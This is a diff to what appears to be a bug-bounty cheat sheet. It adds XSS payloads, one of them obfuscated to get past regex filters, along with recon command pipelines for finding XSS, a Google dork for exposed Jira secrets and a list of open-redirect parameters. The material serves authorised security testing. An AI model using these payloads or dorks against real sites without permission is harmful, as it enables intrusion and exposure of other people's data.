@@ -267,7 +267,7 @@ nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
 <style/onerror=eval(name)>
 ```
 
-### XSS Email User Input 
+## XSS Email User Input 
 * The email: test@test.com is being reflected
 * But its required "@" in the email field
 * Following up the [Brutelogic explanation](https://brutelogic.com.br/blog/xss-limited-input-formats/) for limited input formats
@@ -278,10 +278,100 @@ nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
 ```
 
 * [Medium post source](https://medium.com/bugbountywriteup/reflected-user-input-xss-c3e681710e74)
+
+## XSS payload with Alert Obfuscation, for bypass RegEx filters
+
+```html
+<img src="X" onerror=top[8680439..toString(30)](1337)>
+```
 ## More XSS Payloads
 
 ```html
 #><img src=x onerror=alert()>.jpg
 ```
+```html
+">'><details/open/ontoggle=confirm(1337)>
+```
+
+## Method #1 to find XSS
+```console
+amass enum -passive -norecursive -noalts -d domain .com -o domain.txt
+
+cat domain.txt | httpx -o domainhttpx.txt
+
+cat domainhttpx.txt | nuclei -t /home/orwa/nuclei-templates
+```
+Tools:
+- [amass](https://github.com/OWASP/Amass)
+- [httpx](https://github.com/projectdiscovery/httpx)
+- [nuclei](https://github.com/projectdiscovery/nuclei)
+- [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates)
+
+## Method #2 to find XSS
+
+1) [Wayback](https://github.com/tomnomnom/waybackurls) to get all URLs
+2) Filtered only URLS with parameter and store it in a file
+3) [KXSS](https://github.com/tomnomnom/hacks/tree/master/kxss)
+
+
+
+## Find Jira misconfigurations (passwords and secrets) using simple Google Dork
+
+- ```site:http://atlassian.net "company"```
+    - [Google dorks list](https://github.com/obheda12/GitDorker/tree/master/Dorks)
+
+## Open Redirect params
+
+```
+/[redirect]
+?targetOrigin=[redirect]
+?fallback=[redirect]
+?query=[redirect]
+?redirection_url=[redirect]
+?next=[redirect]
+?ref_url=[redirect]
+?state=[redirect]
+?l=[redirect]
+?redirect_uri=[redirect]
+?forum_reg=[redirect]
+?return_to=[redirect]
+?redirect_url=[redirect]
+?return_url=[redirect]
+?host=[redirect]
+?url=[redirect]
+?redirectto=[redirect]
+?return=[redirect]
+?prejoin_data=[redirect]
+?callback_url=[redirect]
+?path=[redirect]
+?authorize_callback=[redirect]
+?email=[redirect]
+?origin=[redirect]
+?continue=[redirect]
+?domain_name=[redirect]
+?redir=[redirect]
+?wp_http_referer=[redirect]
+?endpoint=[redirect]
+?shop=[redirect]
+?qpt_question_url=[redirect]
+?checkout_url=[redirect]
+?ref_url=[redirect]
+?redirect_to=[redirect]
+?succUrl=[redirect]
+?file=[redirect]
+?link=[redirect]
+?referrer=[redirect]
+?recipient=[redirect]
+?redirect=[redirect]
+?u=[redirect]
+?hostname=[redirect]
+?returnTo=[redirect]
+?return_path=[redirect]
+?image=[redirect]
+?requestTokenAndRedirect=[redirect]
+?retURL=[redirect]
+?next_url=[redirect]
+```
+
 ***
 
